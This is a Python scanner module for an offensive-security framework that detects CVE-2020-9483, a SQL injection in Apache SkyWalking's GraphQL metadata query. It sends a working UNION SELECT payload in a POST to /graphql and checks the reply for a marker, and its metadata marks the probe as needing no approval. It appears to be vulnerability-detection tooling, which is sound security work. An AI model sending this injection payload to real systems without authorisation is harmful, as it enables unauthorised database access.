#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""When using H2/MySQL/TiDB as Apache SkyWalking storage and a metadata query through GraphQL protocol, there is ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SkyWalking SQLI Detection',
        'description': "When using H2/MySQL/TiDB as Apache SkyWalking storage and a metadata query through GraphQL protocol, there is a SQL injection vulnerability which allows access to unexpected data. Apache SkyWalking 6.0.0 to 6.6.0, 7.0.0 H2/MySQL/TiDB storage implementations don't use the appropriate way to set SQL parameters.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'sqli', 'skywalking', 'apache', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/apache/skywalking/pull/4639',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-9483',
            'https://github.com/Elsfa7-110/kenzer-templates',
            'https://github.com/developer3000S/PoC-in-GitHub',
            'https://github.com/pen4uin/awesome-vulnerability-research',
        ],
        'cve': 'CVE-2020-9483',
    }

    def run(self):
        path = '/graphql'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"query":"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:\\"all_p99\\",id:\\"\') UNION SELECT 1,CONCAT(\'~\',\'9999999999\',\'~\')-- \\",}, duration: $d){values{value}}}","variables":{"d":{"start":"2021-11-11","end":"2021-11-12","step":"DAY"}}}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("UNION SELECT 1,CONCAT('~','9999999999','~')--", 'Exception while fetching data',)
        header_any = ('Content-Type: application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason='SkyWalking SQLI detected',
                path=path,
            )
            return True
        return False

